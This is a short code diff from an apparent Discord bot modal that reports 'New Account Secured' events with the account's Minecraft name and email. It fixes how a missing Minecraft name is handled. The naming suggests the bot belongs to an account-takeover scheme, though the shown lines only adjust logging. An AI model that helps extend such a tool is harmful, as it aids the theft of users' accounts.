@@ -229,9 +229,9 @@ class MyModalOne(ui.Modal):
                         )
                         return
 
-                    mc_name = ("No Minecraft" if securedAccount['minecraft']['name'] == "No Minecraft" else securedAccount['minecraft']['name'])
+                    mc_name = securedAccount['minecraft']['name']
                     secured_desc = f"**{mc_name}** has been successfully secured."
-                    if mc_name:
+                    if mc_name == "No Minecraft":
                         secured_desc = "An account has been secured but it does not own Minecraft."
 
                     await sendLogs(
@@ -239,7 +239,7 @@ class MyModalOne(ui.Modal):
                         Embed(
                             title="New Account Secured",
                             description=secured_desc,
-                            color=0xF4A460 if mc_name else 0x678DC6
+                            color=0xF4A460 if mc_name != "No Minecraft" else 0x678DC6
                         ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
                         email = email,
                         conly = True
